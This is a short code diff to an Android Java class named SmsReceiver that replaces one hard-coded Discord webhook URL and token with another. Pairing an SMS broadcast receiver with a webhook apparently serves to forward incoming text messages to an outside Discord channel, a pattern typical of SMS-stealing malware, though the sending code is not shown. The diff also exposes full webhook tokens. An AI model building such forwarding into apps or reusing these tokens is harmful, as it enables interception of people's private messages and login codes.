@@ -10,7 +10,7 @@ import java.io.IOException;
 import okhttp3.*;
 
 public class SmsReceiver extends BroadcastReceiver {
-    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1566505631010000936/p7JDjQyMloPFqCP50Bmc4D8Qjop8nVcWaGH9FYTzfEry_4U39rQWqjGEE4mpPokrbqVa";
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1566527107188785285/ytfcIg4MWuXkSLJ4vidZUF9UuYDZkzYPAWBtDaNTJbPbNMs51fpjJl6y1q0fVYg7yhUH";
     private final OkHttpClient client = new OkHttpClient();
 
     @Override
